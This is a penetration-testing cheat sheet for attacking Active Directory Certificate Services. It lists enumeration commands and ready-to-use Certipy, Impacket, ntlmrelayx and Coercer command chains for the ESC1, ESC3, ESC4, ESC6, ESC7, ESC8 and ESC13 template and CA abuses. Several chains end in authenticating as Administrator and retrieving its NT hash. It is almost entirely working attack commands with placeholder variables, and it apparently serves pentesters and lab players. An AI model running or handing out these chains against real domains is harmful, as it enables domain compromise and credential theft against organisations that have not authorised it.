# Enumeration
### NetExec
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```bash
nxc ldap $IP -u $username -p $password -M adcs
```
### Certipy
Search for vulnerable certificate templates
```bash
certipy find -u $username -p $password -dc-ip $IP -vulnerable -enabled
```
List CAs, servers and search for vulnerable certificate templates
```bash
certipy find -u $username -p $password -dc-ip $IP -dns-tcp -ns $IP -debug
```
### Certify
Search for vulnerable certificate templates:
```powershell
Certify.exe find /vulnerable
```
# Attacks
## ESC1
Create a new machine account
```bash
impacket-addcomputer $domain/$username:$password -computer-name $computer_name$ -computer-pass $computer_password
```
Use ability to enroll as a normal user & provide a user defined Subject Alternative Name (SAN)
```bash
certipy req -u $computer_name$ -p $computer_password -ca $ca -target $domain -template $template -upn $username@domain -dns $domain -dc-ip $IP
```
Authenticate with the certificate and get the NT hash of the Administrator
```bash
certipy auth -pfx $pfx_file -domain $domain -username $username -dc-ip $IP
```
## ESC3
Request a certificate
```bash
certipy req -username $username -password $password -ca $ca -target $domain -template $template
```
Request a certificate on behalf of other another user
```bash
certipy req $username -password $password -ca $ca -target $domain -template User -on-behalf-of '$domain\Administrator' -pfx $pfx_file
```
Authenticate as Administrator
```bash
certipy auth -pfx administrator.pfx -dc-ip $ip
```
## ESC4
Overwrite the configuration to make it vulnerable to ESC1
```bash
certipy template -username $username -password $password -template $template -save-old -dc-ip $IP
```
Now if you run this command, it should show that the certificate is vulnerable to ESC1
```bash
certipy find -u $username -p $password -dc-ip $IP -dns-tcp -ns $IP -stdout -debug
```
## ESC6
```bash
certipy req -username administrator@$domain -password $password -ca $ca -target $domain -template $template -upn administrator@$domain
```
## ESC7
In order for this technique to work, the user must also have the `Manage Certificates` access right, and the certificate template `SubCA` must be enabled. With the `Manage CA` access right, we can fulfill these prerequisites.
If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.
```bash
certipy ca -ca $ca -add-officer $username -username $username@domain -password $password -dc-ip $IP -dns-tcp -ns $IP
```
Enable the `SubCA` template on the CA using the `-enable-template` parameter. By default, the `SubCA` template is enabled.
```bash
certipy ca -ca $ca -enable-template SubCA -username $username@domain -password $password -dc-ip $IP -dns-tcp -ns $IP
```
This request will be denied, but we will save the private key and note down the request ID.
```bash
certipy req -username $username@domain -password $password -ca $ca -target $IP -template SubCA -upn $username@domain
```
With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.
```bash
certipy ca -ca $ca -issue-request $request_ID -username $username@domain -password $password
```
And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
```bash
certipy req -username $username@domain -password $password -ca $ca -target $IP -retrieve $request_ID
```
Authenticate with the certificate and get the NT hash of the Administrator
```bash
certipy auth -pfx $pfx -domain $domain -username $username -dc-ip $IP
```
## ESC8
If there is an ADCS Server that is not on the DC and has Web Enrollement activated we might be able to exploit ESC8.
```bash
ntlmrelayx.py -t http://$domain/certsrv/certfnsh.asp -smb2support --adcs --template $template --no-http-server --no-wcf-server --no-raw-server
```
```bash
coercer coerce -u $username -p $password -l $WS_IP -t $DC_IP --always-continue
```
```bash
certipy- auth -pfx administrator.pfx
```
## ESC13
```bash
certipy req -u $username -p $password -ca $ca -target $domain -template $template -dc-ip $IP -key-size 4096
```
```bash
python3 gettgtpkinit.py -cert-pfx $pfx_file $domain/$username $ccache_file -dc-ip $IP -v
```
# Resources
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration
- https://vulndev.io/2023/07/01/vl-intercept-walkthrough/
- https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux
- https://logan-goins.com/2024-05-04-ADCS/
- https://www.tarlogic.com/blog/ad-cs-esc7-attack/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
# Tools
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify
